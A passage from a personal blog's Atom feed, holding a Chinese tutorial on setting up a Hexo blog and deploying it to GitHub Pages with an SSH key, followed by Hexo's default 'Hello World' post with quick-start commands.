src="https://img.imgdb.cn/item/605844dd8322e6675c746ccd.png"><br>这里可以直接使用<code>git bash</code>执行命令</p><h3 id="3-安装Hexo"><a href="#3-安装Hexo" class="headerlink" title="3.安装Hexo"></a>3.安装Hexo</h3><p><code>nodejs</code>和<code>git</code>环境安装完成之后，就可以正式开始Hexo的安装了<br>为Hexo选择一个文件夹（也可以新建一个文件夹，我是直接新建了一个blog文件夹），在这个文件夹下<code>git bash</code><br>执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>完成之后依旧用<code>hexo -v</code>查看一下版本<br>接下来在刚刚打开的git窗口中初始化Hexo，执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init myblog</span><br></pre></td></tr></table></figure><p>这里的myblog是我定义的文件夹名，也就是Hexo会初始化在这个文件夹中<br>继续执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> myblog //进入这个myblog文件夹</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p>新建完成后，指定文件夹目录下有以下几个文件</p><ul><li>node_modules: 依赖包</li><li>public：存放生成的页面</li><li>scaffolds：生成文章的一些模板</li><li>source：用来存放你的文章</li><li>themes：主题</li><li>** _config.yml: 博客的配置文件**</li></ul><p>执行以下命令，就可以运行blog啦</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g //generate</span><br><span class="line">hexo s //server</span><br></pre></td></tr></table></figure><p>打开浏览器输入<strong>localhost:4000</strong>就可以看到你的博客。</p><h3 id="4-将Hexo部署到GitHub"><a href="#4-将Hexo部署到GitHub" class="headerlink" title="4.将Hexo部署到GitHub"></a>4.将Hexo部署到GitHub</h3><h4 id="GitHub创建个人仓库"><a href="#GitHub创建个人仓库" class="headerlink" title="GitHub创建个人仓库"></a>GitHub创建个人仓库</h4><p>首先，你先要有一个<a href="https://github.com/">GitHub</a>账户，去注册一个吧。</p><p>注册完登录后，点进右上角<code>settings</code>中，有一个<code>repositories</code>，点击它,然后点击<code>creat one</code></p><p><img src="https://img.imgdb.cn/item/6058491d8322e6675c771a18.png"></p><p><code>.github.io</code>前面的名字一定要和你的用户名一样，不然后面要部署到<code>GitHub page</code>的时候就会出错，其他的不用点<br>点击<code>create repository</code><br><img src="https://img.imgdb.cn/item/60584a268322e6675c779d40.png"></p><h4 id="生成SSH添加到GitHub"><a href="#生成SSH添加到GitHub" class="headerlink" title="生成SSH添加到GitHub"></a>生成SSH添加到GitHub</h4><p>回到 <code>git bash</code>中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;yourname&quot;</span> //yourname是你的Github的用户名</span><br><span class="line">git config --global user.email <span class="string">&quot;youremail&quot;</span> //youremail是你的Github的邮箱</span><br></pre></td></tr></table></figure><p>创建SSH，有选项的地方直接回车就完事</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;youremail&quot;</span></span><br></pre></td></tr></table></figure><p>最终生成的公钥和密钥保存在你电脑中的<code>.ssh</code>隐藏文件夹中，找不到可以百度</p><p>进入到文件夹，可以看到有俩东西<br><code>id_rsa</code>是你这台电脑的私钥<br><code>id_rsa.pub</code>是连接你这台电脑的公钥<br>把这个公钥放在<code>GitHub</code>上，这样当你链接<code>GitHub</code>自己的账户时，它就会根据公钥匹配你的私钥，当能够相互匹配时，才能够顺利的通过git上传你的文件到<code>GitHub</code>上。</p><p>在Github的<code>settings</code>中，找到<code>SSH keys</code>，选择<code>New SSH key</code><br><img src="https://img.imgdb.cn/item/60584cb98322e6675c78ff1f.png"><br>点进去之后，title随便取，将<code>id_rsa.pub</code>里面的内容复制到Key下面的框中<br><img src="https://img.imgdb.cn/item/60584d008322e6675c791b37.png"></p><p>到这就差不多完成啦<br>使用命令查看是否配置完成，出现下图中的内容则表示成功连接了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p><img src="https://img.imgdb.cn/item/60584e028322e6675c79d496.png"></p><h4 id="将hexo部署到GitHub"><a href="#将hexo部署到GitHub" class="headerlink" title="将hexo部署到GitHub"></a>将hexo部署到GitHub</h4><p>前面的配置都完成之后，这是最后一步，让<code>Hexo</code>与<code>Github</code>关联起来，然后就可以访问我们部署在<code>Github</code>上的<code>Hexo</code>主页啦<br>在根目录中找到<code>_config.yml</code>，翻到最后，修改<code>YourgithubName</code>为你的<code>GitHub</code>账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: &#39;git&#39;</span><br><span class="line">  repository: https:&#x2F;&#x2F;github.com&#x2F;YourgithubName&#x2F;YourgithubName.github.io.git</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure><p>然后安装<code>deploy-git</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>最后一步，也是每次跟新文章都要进行的一步，俗称<strong>Hexo</strong>三连</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean  //清除了你之前生成的东西,即清除缓存</span><br><span class="line">hexo g  //generate，顾名思义，生成静态文章</span><br><span class="line">hexo d  //deploy，部署文章到Github</span><br></pre></td></tr></table></figure><p>国内服务器部署到<code>Github</code>可能会被墙，多试几次或者添加代理<br>怎么添加代理可以参考<a href="https://spoience.com/articles/git-npm-proxy.html">这篇文章</a>，仅供参考</p><p>至此，你的<code>Hexo</code>就成功部署到了<code>Github</code>上，访问<code>http://yourname.github.io</code>就可以看到你的博客啦</p><h3 id="5-Hexo的一些常见配置说明"><a href="#5-Hexo的一些常见配置说明" class="headerlink" title="5.Hexo的一些常见配置说明"></a>5.Hexo的一些常见配置说明</h3><p><code>_config.yml</code>配置文件说明，<a href="https://hexo.io/zh-cn/docs/configuration.html">点我</a><br>更换主题：<a href="https://hexo.io/zh-cn/docs/themes.html">传送门</a> 我用的是Jerry大佬写的butterfly，具体配置可以看<a href="https://butterfly.js.org/">Jerry的博客</a><br>Hexo可以使用MD进行对文章的编辑，MD语法可以参考<a href="https://www.jianshu.com/p/399e5a3c7cc5">MD语法入门</a></p><p><strong>学习记录，仅供参考~</strong></p>]]></content>
    
    
    <summary type="html">Hexo博客搭建过程</summary>
    
    
    
    <category term="Hexo" scheme="https://shuaiqiyu.github.io/Categories/Hexo/"/>
    
    
    <category term="Hexo" scheme="https://shuaiqiyu.github.io/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://shuaiqiyu.github.io/2021/03/15/hello-world/"/>
    <id>https://shuaiqiyu.github.io/2021/03/15/hello-world/</id>
    <published>2021-03-15T06:22:09.277Z</published>
    <updated>2021-03-22T10:07:44.278Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><figcaption><span>install git</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    <category term="Hexo" scheme="https://shuaiqiyu.github.io/Categories/Hexo/"/>
    
    
    <category term="web" scheme="https://shuaiqiyu.github.io/tags/web/"/>
    
    <category term="tag" scheme="https://shuaiqiyu.github.io/tags/tag/"/>
    
  </entry>
  
</feed>
